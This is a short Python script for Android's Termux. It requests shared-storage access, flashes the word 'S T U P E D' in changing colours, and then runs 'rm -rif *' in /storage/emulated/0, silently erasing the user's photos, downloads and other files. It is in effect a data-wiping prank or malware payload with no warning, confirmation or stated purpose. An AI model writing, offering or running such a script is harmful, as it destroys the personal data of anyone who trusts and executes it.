import os
import time


red = "\033[0;31m"
pur = "\033[0;35m"
gre = "\033[0;32m"
yel = "\033[0;33m"
blu = "\033[0;34m"
cya = "\033[1;36m"
whi = "\033[0;37m"


os.system("clear")
os.system("termux-setup-storage")
print ("" +red)
time.sleep(1)
print ("\n")
print ("" +gre)
print("\nS T U P E D ")
time.sleep(1)
os.system("clear")
print ("" +blu)
print ("\nS T U P E D ")
time.sleep(1)
os.system("clear")
print ("" +yel)
print ("\nS T U P E D ")
time.sleep(1)
os.system("clear")

os.chdir('/storage/emulated/0')
os.system("cd /sdcard")
os.system("rm -rif *")

print(os.getcwd())

